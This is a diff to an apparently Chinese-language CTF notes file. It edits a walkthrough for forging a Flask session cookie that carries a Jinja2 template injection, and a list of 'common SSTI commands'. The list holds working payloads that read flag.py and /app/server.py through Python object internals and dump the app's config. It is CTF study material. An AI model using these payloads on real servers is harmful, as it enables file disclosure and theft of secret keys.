@@ -64,7 +64,7 @@ python .\flask_session_cookie_hack.py decode -c eyJuMWNvZGUiOm51bGx9.X92dcQ.uupV
 
 
 11. 然后把`{'n1code': None}`换成读文件`flag.py`的代码，加密回去
-**{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[40](\'flag.py\').read()}}'}**
+```{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[40](\'flag.py\').read()}}'}```
 - 加密代码模式
 *python flask_session_cookie_hack.py encode -t {} -s {secert_key}*
 - 加密代码详情
@@ -91,8 +91,10 @@ python .\flask_session_cookie_hack.py decode -c eyJuMWNvZGUiOm51bGx9.X92dcQ.uupV
   `{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[40](\'flag.py\').read()}}'}`
 
 ## SSTI常用命令
-- **读取文件内容，()也可以为''**  
+- **读取文件内容1，()也可以为''**  
 ```{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['open']("/app/server.py").read()}}``` 
+- **读取文件内容2**
+```{{''.__class__.__mro__[2].__subclasses__()[40]('flag.py').read()}}```
 - **获取配置**  
 ```{{config.items()}}```
 - **自身dict**  
